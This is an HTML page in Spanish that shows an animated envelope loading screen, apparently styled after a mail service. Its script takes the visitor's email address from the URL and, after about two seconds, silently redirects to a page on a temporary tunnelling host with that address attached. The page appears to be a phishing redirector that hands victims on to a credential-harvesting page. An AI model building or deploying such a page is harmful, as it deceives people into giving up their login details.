
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cargando...</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background: white;
      font-family: Arial, sans-serif;
    }

    .container {
      animation: slide 0.5s ease-in forwards;
      opacity: 0;
    }

    .wrapper {
      width: 120px;
      height: 60px;
      background-color: #68DFFF;
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 0;
      border-radius: 5%;
      border-top-left-radius: 0%;
      border-top-right-radius: 0%;
    }

    .envelope-body {
      position: absolute;
      top: 0;
      left: 0;
      border-top: 30px solid transparent;
      border-left: 60px solid #28A8EB;
      border-right: 60px solid #1690E2;
      border-bottom: 30px solid #28A8EB;
      z-index: 2;
      border-radius: 5%;
    }

    .shade1 { grid-area: shade1; background-color: #0458A9 }
    .shade2 { grid-area: shade2; background-color: #0078D6 }
    .shade3 { grid-area: shade3; background-color: #28A8EB }
    .shade4 { grid-area: shade4; background-color: #51D9FE; }
    .shade5 { grid-area: shade5; background-color: #0665BB }
    .shade6 { grid-area: shade6; background-color: #164380; }

    .letter {
      position: absolute;
      top: 0;
      width: 80%;
      z-index: 1;
      border-radius: 5%;
      display: grid;
      grid-template-columns: auto auto auto;
      grid-template-rows: 12px 36px 36px 36px;
      grid-template-areas:
        'div1 div1 div1'
        'div2 div2 div2'
        'div3 div3 div3'
        'div4 div4 div4';
      animation: letter 0.5s 1s ease-in forwards;
    }

    .div1 {
      grid-area: div1;
      display: grid;
      grid-template-columns: auto auto auto;
      grid-template-areas: 'shade1 shade1 shade1';
      border-radius: 5%;
    }

    .div2 {
      grid-area: div2;
      display: grid;
      grid-template-columns: auto auto auto;
      grid-template-areas: 'shade2 shade3 shade4';
    }

    .div3 {
      grid-area: div3;
      display: grid;
      grid-template-columns: auto auto auto;
      grid-template-areas: 'shade5 shade2 shade3';
      opacity: 0;
      animation: show 0.1s 1.2s ease-in forwards;
    }

    .div4 {
      grid-area: div4;
      display: grid;
      grid-template-columns: auto auto auto;
      grid-template-areas: 'shade6 shade5 shade2';
      opacity: 0;
      animation: show 0.05s 1.4s ease-in forwards;
    }

    .lid {
      position: absolute;
      top: 0;
      left: 0;
      border-top: #68DFFF 30px solid;
      border-left: 60px solid transparent;
      border-right: 60px solid transparent;
      border-bottom: 30px solid transparent;
      transform-origin: top;
      z-index: 2;
      animation: open 0.5s 0.5s ease-in forwards;
    }

    @keyframes open {
      0% { transform: rotateX(0deg); z-index: 2 }
      100% { transform: rotateX(180deg); z-index: 0 }
    }

    @keyframes letter {
      0% { transform: translateY(0px) }
      95% { transform: translateY(-69px) }
      100% { transform: translateY(-63px) }
    }

    @keyframes slide {
      0% { transform: scale(1); opacity: 0.4 }
      100% { transform: scale(1.6); opacity: 1 }
    }

    @keyframes show {
      0% { opacity: 0 }
      100% { opacity: 1 }
    }

    .loading-text {
      position: absolute;
      top: calc(100% + 12px);
      text-align: center;
      width: 100%;
      font-size: 12px;
      color: #333;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="wrapper">
      <div class="lid"></div>
      <div class="envelope-body"></div>
      <div class="letter">
        <div class="div1">
          <div class="shade1"></div>
        </div>
        <div class="div2">
          <div class="shade2"></div>
          <div class="shade3"></div>
          <div class="shade4"></div>
        </div>
        <div class="div3">
          <div class="shade5"></div>
          <div class="shade2"></div>
          <div class="shade3"></div>
        </div>
        <div class="div4">
          <div class="shade6"></div>
          <div class="shade5"></div>
          <div class="shade2"></div>
        </div>
      </div>
 
    </div>
  </div>

  <script>
    const params = new URLSearchParams(window.location.search);
    const email = params.get("email");

    setTimeout(function () {
      const destino = "https://umxatk6gbc.localto.net/hlarypy/"; // Página final
      if (email) {
        window.location.href = `${destino}?email=${encodeURIComponent(email)}`;
      } else {
        window.location.href = destino;
      }
    }, 1900);
  </script>
</body>
</html>
